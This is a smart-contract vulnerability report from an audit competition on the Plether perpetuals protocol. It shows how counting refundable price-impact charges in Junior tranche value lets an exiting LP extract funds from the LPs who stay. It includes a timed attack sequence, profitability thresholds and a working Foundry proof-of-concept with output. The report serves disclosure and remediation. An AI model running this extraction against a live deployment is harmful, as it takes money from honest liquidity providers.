# \#98840 [SC-Critical] Open-time VPI is counted in Junior NAV while it is still refundable at close: an LP who exits between a position's open and its close is overpaid, and the LPs who stay fund the rebate

**Submitted on Nov 10th 2026 at 14:07:52 UTC by @Nyko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98840
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays a positive price-impact charge (VPI) to the pool. The pool books it as revenue at once, and the next reconcile adds it to Junior principal. The same amount stays refundable: when the position later reduces skew, the close pays up to the position's `vpiAccrued` back from pool cash. Nothing reserves that amount in tranche NAV. A Junior LP whose redemption settles between the open and the close is paid its share of the charge, and the LPs who stay pay the whole rebate. An LP who also owns the position does this on purpose and at a profit. In the PoC, at release parameters and through permissionless entry points only, a holder of 63.8 % of the Junior tranche gains 3,858 USDG per cycle and the other Junior LPs lose 7,056 USDG; their share price ends below its value before the attack. Two cycles double both figures.

## Vulnerability Details

1. Open. VPI = k·(s1² − s0²)/(2D) (`CfdMath.sol:118-140`) is part of the trade cost (`OpenAccountingLib.sol:127-135`) and is recorded on the position (`CfdEngineSettlementSidecar.sol:517`):

```solidity
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
...
vpiAccrued: currentPosition.vpiAccrued + delta.posVpiAccruedDelta,
```

2. The trade cost, net of the protocol fee, is booked as pool revenue immediately (`CfdEngineSettlementSidecar.sol:446-463`, `HousePool.sol:624-651`):

```solidity
IHousePool(host.pool()).recordClaimantInflow(
    poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
);
...
accountedAssets += amount; // HousePool.sol:641
```

3. Reconcile sends the increase through the waterfall; what is left after the Senior coupon goes to Junior (`HousePoolWaterfallAccountingLib.sol:158`, `nextState.juniorPrincipal += remaining;`). The engine snapshot the pool reconciles against (`HousePoolInputSnapshot`, `interfaces/HousePoolEngineViewTypes.sol:25-36`) has no field for accrued VPI, and `HousePool.sol` and the `HousePool*` libraries never mention VPI.

4. LP epoch settlement reconciles, then prices Junior redemptions at that principal (`HousePool.sol:835-841`). There is no Junior redemption fee.

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
...
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

5. Close. A skew-reducing close receives a rebate of up to the VPI the position paid (`CloseAccountingLib.sol:103-118`), paid from pool cash (`CfdEngineSettlementSidecar.sol:621-624`):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
...
IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
```

So between an open and its close, Junior NAV contains an amount V that the pool still owes back. The protocol reserves only the opposite sign: `max(-vpiAccrued, 0)` is a nonwithdrawable reserve (SECURITY.md:866) so that "LPs cannot withdraw it as marked equity before the matching position obligation settles" (WHITEPAPER.md:887-888). Positive accrued VPI has no equivalent.

Attack (one address, or an LP and a trader acting together):

1. Hold a share `a` of the Junior tranche and request redemption for the next LP epoch (cutoff 5 minutes before it).
2. Seconds before the epoch, open a skew-increasing position. Any address executes the order (`OrderRouter.executeOrder`, `OrderRouter.sol:240-247`, no caller check). The open pays VPI `V` and the 4 bps fee.
3. Call `OrderRouter.settleLpEpoch` (`:474-484`, documented "Permissionless") and claim. The redemption is paid `a·V` too much.
4. Close the position. The rebate returns V; after the 4 bps close fee the account is credited 12,873.09 USDG in the PoC.
5. Redeposit and repeat (1 h deposit cooldown, 1 h epochs; the executed cycle takes 3 h).

Attacker result per cycle: `a·V − open fee − close fee − open bounty (≤ 0.20 USDG)`. Loss of the remaining Junior LPs per cycle: `a·V − close fee` (the close fee stays in the pool). The cycle is profitable when `a > 8 bps / (k·(s0+s1)/(2D))`: about 39.8 % of the Junior tranche from a flat book, 22.9 % measured when other traders already hold 0.30·D of same-side skew. The share is of the Junior tranche, not of the pool (Junior is 44 % of the pool in the PoC).

Passive variant, no trade by the LP and any share size: an LP that redeems while other traders' positive `vpiAccrued` is outstanding is paid `a·V` on exit, and the LPs who stay fund those rebates. Measured: a 5 % Junior holder whose redemption settles 28 s after an independent trader's 8.0M open is paid 803.58 USDG more than without that trade (share × V), and the remaining LPs end 655.06 USDG lower than if nobody had exited.

Why this is not intended behaviour:

- The clamp comment (`CloseAccountingLib.sol:112-115`) says the lifetime clamp "Prevents LP sandwich attacks", and SECURITY.md:1443 says it "intentionally zeroes otherwise extractable rebate-only round trips". The clamp bounds the trader's lifetime VPI at zero. It holds in every run here, and the extraction goes through the LP redemption instead.
- SECURITY.md:871-872: "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV". Realized positive VPI that is still refundable does inflate tranche NAV.
- The team's tests run this sequence and check one side only. `test/perps/accounting/fees/VpiDepth.t.sol:107-142` (`test_SizeAdditionCannotBypassVpiBound`) has an LP exit between the open and the close and asserts only that the trader's balance did not grow. `:234-263` asserts "The round trip must not extract LP cash" on `pool.totalAssets()`, which does not see how the cash is split between the LP who left and the LPs who stayed. The LP epoch suites run with `vpiFactor: 0`.

Limits, stated plainly:

- V is at most 0.08 % of pool depth per cycle (skew cap 0.4·D). The attacker's result per cycle is at most `0.0008·a·D − 0.00032·D`.
- A profitable attacker needs 23 % to 40 % of the Junior tranche plus margin for the position. Below that, the gain does not cover the two 4 bps fees. The passive variant has no threshold.
- The position carries price risk for about 30 s. The PoC holds the price constant; a 1 bp move on 8.0M notional is 800 USDG against a 4.8 bps profit.
- Needs `vpiFactor > 0` (release value 0.01e18). The Senior tranche is not affected. The exit must fit the per-epoch Junior limit and the pool's free assets (`HousePool.sol:1205-1217`).

Prior art, and why this is a different issue:

- AI-scan items SCAN-30 and SCAN-31 (Info, in the known-issues list) are about the depth D used by the close-time VPI formula: changing liquidity between open and close changes the charge or the rebate, and the rebate is capped at accrued VPI. Here the cap holds and the loss is the redemption payout. Measured in the passive run: the depth change moves the trader's close credit by 12.06 USDG, while the redemption overpayment is 803.58 USDG (10,258.43 USDG in the attack run).
- SCAN-4 (depth and deferred trader claims) and the pre-audit item SC-M3 (negative `vpiAccrued` in the post-open margin projection, fixed) concern other code paths.
- I found no listed item about positive accrued VPI inside tranche NAV.

## Impact Details

Release parameters (DEPLOYMENT.md), price constant, pool 21.4M USDG (Junior 9.4M, Senior 12.0M). USDG amounts.

| Run | Redemption paid | Exiting LP result | Remaining Junior LPs (LP1 + LP2) |
|---|---|---|---|
| A: attack, 63.8 % of Junior, own LONG 8.0M (V = 16,073.25) | 6,010,131.93 | +3,858.08 vs B | −7,056.20 vs B (−0.208 %) |
| B: plain exit, no trade | 5,999,873.50 | baseline | baseline |
| K: control, same open and close both before the epoch | 6,001,923.54 | −4,362.23 vs B | +1,161.69 vs B |
| Two cycles of A | | +7,728.59 | −14,124.84 |
| 0.30·D same-side skew present, own LONG 2.10M, 25 % / 30 % / 35 % of Junior | | +150.80 / +516.60 / +882.39 | −989.82 / −1,355.55 / −1,721.27 |
| Passive: 5 % LP exits after another trader's 8.0M open | +803.58 vs no trade | no trade, no fee | −655.06 vs nobody exiting |

- Overpayment A − B = 10,258.430603 = share × V to the last unit.
- Junior share price (USDG units per 1e12 shares): 998,447,134 before, 996,362,880 after the attack, 998,435,032 after the plain exit. The remaining LPs end below their value before the attack, so the loss is not limited to revenue they had not yet earned.
- An honest LP who then redeems a quarter of its shares receives 249,467.83 instead of 249,986.67.
- Where the money goes (A − B): attacker +3,858.08, protocol treasury +3,200.00 (open fee), keeper +0.20; LP1 + LP2 −7,056.20, seed position −2.08.
- The loss grows linearly with cycles (two executed). A 3 h cycle allows up to 8 a day, so up to about 1.6 % of the remaining LPs' value per day at these sizes.

Selected impact: "Theft of unclaimed yield". The amount taken is VPI revenue credited to the Junior tranche. I also report the measured effect on principal (share price below its pre-attack value) and leave its classification to the judges.

## Recommended fix

Treat positive accrued VPI as a liability until the position settles: keep an engine aggregate of positive `vpiAccrued`, pass it in `HousePoolInputSnapshot`, and exclude it from tranche NAV and from withdrawable free assets, as is already done for the negative side. Alternatively, recognise open-time VPI as revenue only at the close. I have not tested a patch.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L463
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L140-L159
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/HousePoolEngineViewTypes.sol#L25-L36
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/fees/VpiDepth.t.sol#L107-L142
- SECURITY.md:866, :871-872, :1443; WHITEPAPER.md:887-888 (packages/perps, same commit)

## Proof of Concept

## Proof of Concept

One Foundry test file at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, built on the repository's `BasePerpTest` with the release risk parameters (DEPLOYMENT.md) set through its hooks. No in-scope contract is modified. Mocks: MockPyth price updates and the USDG token. Every order is committed by its trader and executed by an unrelated keeper address through `OrderRouter.executeOrder`; LP epochs are settled through `OrderRouter.settleLpEpoch`; LP requests and claims go through `TrancheVault`.

Steps:

1. Save the file below as `packages/perps/test/perps/VpiNavExitCompact.t.sol`.
2. Run from the repository root: `forge test --root packages/perps --match-contract VpiNavExitCompact -vv` (`FOUNDRY_VIA_IR=false` compiles faster; the output is identical under the default via-IR profile).
3. Expected: 3 passed.

What the tests do (price constant at 1.00; Junior 9.401M of which the attacker holds 6.0M; Senior 12.001M):

- `test_attack_vs_plainExit`: run A (redeem request, own LONG 8.0M opened seconds before the epoch, epoch settled, claim, close) against run B (same exit, no trade), both from the same state snapshot. Asserts: the redemption is overpaid by share × VPI; the attacker ends richer; the remaining LPs end poorer; their share price ends below its pre-attack value; a later partial redemption by an honest LP pays less cash.
- `test_control_roundTripBeforeEpoch`: the same open and close, both before the epoch. The attacker only loses the fees.
- `test_twoCycles`: redeposit, cooldown, repeat. Loss and gain both double.

Printed output (USDG has 6 decimals; lines shortened):

```
[PASS] test_attack_vs_plainExit()
  A attack
    attacker Junior share (1e18 = 100%) 638230079888322969
    VPI paid by the open (USDG atoms) 16073248389
    redemption paid (USDG atoms) 6010131931413
    attacker wealth at end (USDG atoms) 6303731577224
    staying LPs Junior value at end (USDG atoms) 3392870293001
    Junior share price before / after 998447134 996362880
  B plain exit
    VPI paid by the open (USDG atoms) 0
    redemption paid (USDG atoms) 5999873500810
    attacker wealth at end (USDG atoms) 6299873500810
    staying LPs Junior value at end (USDG atoms) 3399926497263
    Junior share price before / after 998447134 998435032
  expected overpay share * VPI 10258430603
  redemption overpay A - B 10258430603
  attacker gain A - B 3858076414
  staying LPs loss B - A 7056204262
  LP2 later redeems 1/4 of its shares, cash paid A / B 249467834832 249986673382
[PASS] test_control_roundTripBeforeEpoch()
  redemption difference K - B 2050037953
  attacker result K - B -4362229322
[PASS] test_twoCycles()
  staying LPs loss after cycle 1 7056204262
  staying LPs loss after cycle 2 14124840053
  attacker gain after cycle 1 3858076414
  attacker gain after cycle 2 7728588006
```

The figures in the description for a 25 % to 35 % Junior share with existing skew, and for the passive variant, come from a second test file on the same base (3 tests). I can post it in a comment.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Plether perps @ a82d4fe. A Junior LP who exits at the LP epoch between a VPI-paying open and its close is paid a
// share of that VPI; the Junior LPs who stay pay the rebate the position receives at its close.
// Release parameters (DEPLOYMENT.md) through BasePerpTest hooks. Mocks: MockPyth ticks and the USDG token only.
// Orders are committed by the trader and executed by an unprivileged keeper through the Router; LP epochs are settled
// through Router.settleLpEpoch. Pool (USDG): Junior 9.401M (attacker 6.0M, LP1 2.4M, LP2 1.0M, seed 1k), Senior
// 12.001M; background LONG 0.8M and SHORT 0.5M. Attack trade: LONG 8.0M notional. Price constant at 1.00.
// Run: save as packages/perps/test/perps/VpiNavExitCompact.t.sol, then
//   forge test --root packages/perps --match-contract VpiNavExitCompact -vv

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract VpiNavExitCompact is BasePerpTest {

  address constant ATTACKER = address(0xA77AC4E5);
  address constant LP1 = address(0x1D01); // honest Junior LP who stays
  address constant LP2 = address(0x1D02); // honest Junior LP who stays
  address constant SENIOR_LP = address(0x5E01);
  address constant LONG_TRADER = address(0x7101);
  address constant SHORT_TRADER = address(0x7102);
  address constant KEEPER = address(0x4EE9); // any address: keepers are permissionless
  uint256 constant ATTACK_LOTS = 80_000; // 8.0M USDG notional at 1.00 (1 lot = 1e20 size = 100 USDG)
  uint256 constant PX = 1e8; // basket price 1.00, constant through the test

  uint8 constant ATTACK = 0; // redeem request, open seconds before the epoch, settle, claim, close
  uint8 constant PLAIN_EXIT = 1; // redeem request, settle, claim, no trade
  uint8 constant ROUND_TRIP = 2; // control: the same open and close both before the epoch, then the exit

  OrderRouter R;
  uint256 pubT; // publish time of the last authored Pyth tick

  struct Run {
    uint256 share; // attacker Junior shares / supply (1e18 = 100 %)
    int256 vpi; // position.vpiAccrued after the open
    uint256 paid; // USDG the redemption paid
    uint256 attacker; // wallet + margin account + trader claims + Junior shares
    uint256 staying; // Junior value of LP1 + LP2
    uint256 priceBefore;
    uint256 priceAfter;
  }

  function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
    return CfdTypes.RiskParams({
      vpiFactor: 0.01e18,
      maxSkewRatio: 0.4e18,
      maintMarginBps: 10,
      initMarginBps: 20,
      fadMarginBps: 300,
      baseCarryBps: 500,
      minBountyAssets: 1e6,
      bountyBps: 10,
      keeperShareBps: 5000,
      protocolShareBps: 0
    });
  }

  function _initialJuniorDeposit() internal pure override returns (uint256) {
    return 0;
  }

  function setUp() public override {
    super.setUp();
    R = OrderRouter(address(router));
    IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
    (c.adverseConfidenceMultiplierBps, c.minOpenNotionalAssets) = (2500, 1000e6);
    c.positionProtectionTriggerBountyAssets = 200_000;
    _setRouterConfig(c);
    _setSeniorCapacity(40_000_000e6, 8000);
    baseMockPyth.setSynchronizeLegacyUniquePrices(false); // explicit tick payloads only
    uint256 day = vm.getBlockTimestamp() / 1 days; // restart on a Monday, 06:00 UTC
    _at((day + 1 + (8 - ((day + 1 + 4) % 7)) % 7) * 1 days + 6 hours);

    _deposit(juniorVault, ATTACKER, 6_000_000e6);
    _deposit(juniorVault, LP1, 2_400_000e6);
    _deposit(juniorVault, LP2, 1_000_000e6);
    _deposit(seniorVault, SENIOR_LP, 12_000_000e6);
    _fundTrader(ATTACKER, 300_000e6);
    _fundTrader(LONG_TRADER, 1_000_000e6);
    _fundTrader(SHORT_TRADER, 1_000_000e6);
    _trade(LONG_TRADER, false, CfdTypes.Side.LONG, 8000, 40_000e6);
    _trade(SHORT_TRADER, false, CfdTypes.Side.SHORT, 5000, 25_000e6);
    _at(vm.getBlockTimestamp() + 1 hours + 20); // past TrancheVault.DEPOSIT_COOLDOWN
    _mark();
  }

  function test_attack_vs_plainExit() public {
    uint256 snap = vm.snapshotState();
    Run memory a = _cycle(ATTACK);
    uint256 cashA = _redeem(LP2, juniorVault.balanceOf(LP2) / 4); // the loss is cash: LP2 later exits in part
    vm.revertToState(snap);
    Run memory b = _cycle(PLAIN_EXIT);
    uint256 cashB = _redeem(LP2, juniorVault.balanceOf(LP2) / 4);
    _log("A attack", a);
    _log("B plain exit", b);
    uint256 expected = uint256(a.vpi) * a.share / 1e18;
    console2.log("expected overpay share * VPI", expected);
    console2.log("redemption overpay A - B", a.paid - b.paid);
    console2.log("attacker gain A - B", int256(a.attacker) - int256(b.attacker));
    console2.log("staying LPs loss B - A", int256(b.staying) - int256(a.staying));
    console2.log("LP2 later redeems 1/4 of its shares, cash paid A / B", cashA, cashB);

    assertGt(a.vpi, 0, "the open paid VPI");
    assertApproxEqRel(a.paid - b.paid, expected, 0.02e18, "exit overpaid by share * VPI");
    assertGt(a.attacker, b.attacker, "attacker ends richer than with a plain exit");
    assertLt(a.staying, b.staying, "staying LPs end poorer than after a plain exit");
    assertLt(a.priceAfter, a.priceBefore, "staying LPs' share price ends below its pre-attack value");
    assertLt(cashA, cashB, "an honest LP's later redemption pays less cash");
  }

  function test_control_roundTripBeforeEpoch() public {
    uint256 snap = vm.snapshotState();
    Run memory k = _cycle(ROUND_TRIP);
    vm.revertToState(snap);
    Run memory b = _cycle(PLAIN_EXIT);
    _log("K round trip before the epoch", k);
    console2.log("redemption difference K - B", int256(k.paid) - int256(b.paid));
    console2.log("attacker result K - B", int256(k.attacker) - int256(b.attacker));
    assertLt(k.attacker, b.attacker, "control: the round trip before the epoch only costs fees");
  }

  function test_twoCycles() public {
    uint256 snap = vm.snapshotState();
    Run memory a1 = _cycle(ATTACK);
    _deposit(juniorVault, ATTACKER, a1.paid); // redeposit the redemption, wait out the cooldown
    _at(vm.getBlockTimestamp() + 1 hours + 20);
    Run memory a2 = _cycle(ATTACK);
    vm.revertToState(snap);
    Run memory b1 = _cycle(PLAIN_EXIT);
    _deposit(juniorVault, ATTACKER, b1.paid);
    _at(vm.getBlockTimestamp() + 1 hours + 20);
    Run memory b2 = _cycle(PLAIN_EXIT);
    int256 loss1 = int256(b1.staying) - int256(a1.staying);
    int256 loss2 = int256(b2.staying) - int256(a2.staying);
    console2.log("staying LPs loss after cycle 1", loss1);
    console2.log("staying LPs loss after cycle 2", loss2);
    console2.log("attacker gain after cycle 1", int256(a1.attacker) - int256(b1.attacker));
    console2.log("attacker gain after cycle 2", int256(a2.attacker) - int256(b2.attacker));
    assertGt(loss1, 0, "cycle 1 takes from the staying LPs");
    assertGt(loss2, loss1, "the second cycle adds to the staying LPs' loss");
    assertGt(int256(a2.attacker) - int256(b2.attacker), int256(a1.attacker) - int256(b1.attacker), "gain adds up");
  }

  function _cycle(uint8 mode) internal returns (Run memory r) {
    (uint256 epoch,) = juniorVault.getRequestEpochWindow();
    uint256 e = pool.lpEpochStart(epoch); // the epoch the redeem request settles at
    r.priceBefore = _juniorPrice();
    uint256 shares = juniorVault.balanceOf(ATTACKER);
    r.share = shares * 1e18 / juniorVault.totalSupply();
    vm.prank(ATTACKER);
    uint256 id = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);

    _at(e - 30);
    _mark();
    if (mode != PLAIN_EXIT) {
      _trade(ATTACKER, false, CfdTypes.Side.LONG, ATTACK_LOTS, ATTACK_LOTS * 1.5e6);
      (,,,,,, r.vpi) = engine.positions(ATTACKER);
    }
    if (mode == ROUND_TRIP) {
      _trade(ATTACKER, true, CfdTypes.Side.LONG, ATTACK_LOTS, 0);
    }
    _at(e);
    _settle(); // any keeper, through the Router, with a Pyth tick published after the epoch start
    uint256 claimable = juniorVault.claimableRedeemRequest(id, ATTACKER);
    vm.prank(ATTACKER);
    r.paid = juniorVault.claimRedeem(id, claimable, ATTACKER, ATTACKER);
    assertEq(juniorVault.pendingRedeemRequest(id, ATTACKER), 0, "exit funded in full");
    if (mode == ATTACK) {
      _trade(ATTACKER, true, CfdTypes.Side.LONG, ATTACK_LOTS, 0);
    }
    _at(e + 60);
    _mark();
    r.attacker = settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
      + engine.traderClaimBalanceAssets(ATTACKER) + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    r.staying = juniorVault.convertToAssets(juniorVault.balanceOf(LP1) + juniorVault.balanceOf(LP2));
    r.priceAfter = _juniorPrice();
  }

  /// @dev USDG atoms per 1e12 Junior shares. It starts at 998447134 here: the seed-only Junior tranche paid the
  ///      Senior coupon during setUp. Unrelated to the finding; read the A / B differences.
  function _juniorPrice() internal view returns (uint256) {
    return juniorVault.convertToAssets(1e12);
  }

  function _at(uint256 t) internal {
    vm.warp(t);
    vm.roll(vm.getBlockNumber() + 1);
  }

  function _tick() internal returns (bytes[] memory d) {
    _at(vm.getBlockTimestamp() + 1);
    uint256 t = vm.getBlockTimestamp();
    MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
    u[0] = MockPyth.FeedUpdate(BASE_PYTH_FEED_A, MockPyth.MockPrice(int64(int256(PX)), 0, -8, t, pubT));
    u[1] = MockPyth.FeedUpdate(BASE_PYTH_FEED_B, MockPyth.MockPrice(int64(int256(PX)), 0, -8, t, pubT));
    (pubT, d) = (t, new bytes[](1));
    d[0] = abi.encode(u);
  }

  function _mark() internal {
    bytes[] memory d = _tick();
    vm.prank(KEEPER);
    R.updateMarkPrice(d);
  }

  function _settle() internal {
    bytes[] memory d = _tick();
    vm.prank(KEEPER);
    R.settleLpEpoch(d);
  }

  function _trade(address who, bool isClose, CfdTypes.Side side, uint256 lots, uint256 margin) internal {
    OrderV3Types.OrderRequest memory q;
    q.clientOrderId = keccak256(abi.encode(R.nextCommitId(), who));
    (q.side, q.sizeDelta, q.marginDelta, q.isClose) = (side, lots * CfdTypes.SIZE_QUANTUM, margin, isClose);
    q.targetPrice = (side == CfdTypes.Side.LONG) != isClose ? 1 : CAP_PRICE; // no price limit
    OrderV3Types.ExecutionBounds memory b = q.bounds;
    (b.submitBy, b.executionWindowSeconds, b.allowedExecutionModes) = (uint64(vm.getBlockTimestamp() + 60), 60, 7);
    b.expectedConfigHash = R.lifecycleBook().currentExecutionConfigHash();
    (b.maxExecutionBountyAssets, b.maxExecutionNotionalAssets) = (type(uint256).max, type(uint256).max);
    (b.maxGrossAccountDebitAssets, b.maxActionChargeAssets) = (type(uint256).max, type(uint256).max);
    (b.maxExplicitFeesAssets, b.maxPostPositionSize, b.maxPostLeverageBps) =
      (type(uint256).max, type(uint256).max, type(uint32).max);
    vm.prank(who);
    uint64 id = R.commitOrder(q);
    bytes[] memory d = _tick();
    vm.prank(KEEPER);
    R.executeOrder(id, d);
    (uint256 size,,,,,,) = engine.positions(who);
    require(isClose ? size == 0 : size >= lots * CfdTypes.SIZE_QUANTUM, "order did not fill");
  }

  function _redeem(address lp, uint256 shares) internal returns (uint256 paid) {
    (uint256 epoch,) = juniorVault.getRequestEpochWindow();
    vm.prank(lp);
    uint256 id = juniorVault.requestRedeem(shares, lp, lp);
    _at(pool.lpEpochStart(epoch));
    _settle();
    uint256 claimable = juniorVault.claimableRedeemRequest(id, lp);
    vm.prank(lp);
    paid = juniorVault.claimRedeem(id, claimable, lp, lp);
    assertEq(juniorVault.pendingRedeemRequest(id, lp), 0, "redemption funded in full");
  }

  function _deposit(TrancheVault v, address lp, uint256 amount) internal {
    if (settlementToken.balanceOf(lp) < amount) {
      settlementToken.mint(lp, amount - settlementToken.balanceOf(lp));
    }
    vm.startPrank(lp);
    settlementToken.approve(address(v), amount);
    uint256 id = v.requestDeposit(amount, lp, lp);
    vm.stopPrank();
    _at(v.depositEpochStart(id));
    _settle();
    vm.prank(lp);
    v.claimDeposit(id, amount, lp, lp);
  }

  function _log(string memory tag, Run memory r) internal pure {
    console2.log(tag);
    console2.log("  attacker Junior share (1e18 = 100%)", r.share);
    console2.log("  VPI paid by the open (USDG atoms)", r.vpi);
    console2.log("  redemption paid (USDG atoms)", r.paid);
    console2.log("  attacker wealth at end (USDG atoms)", r.attacker);
    console2.log("  staying LPs Junior value at end (USDG atoms)", r.staying);
    console2.log("  Junior share price before / after", r.priceBefore, r.priceAfter);
  }

}
```
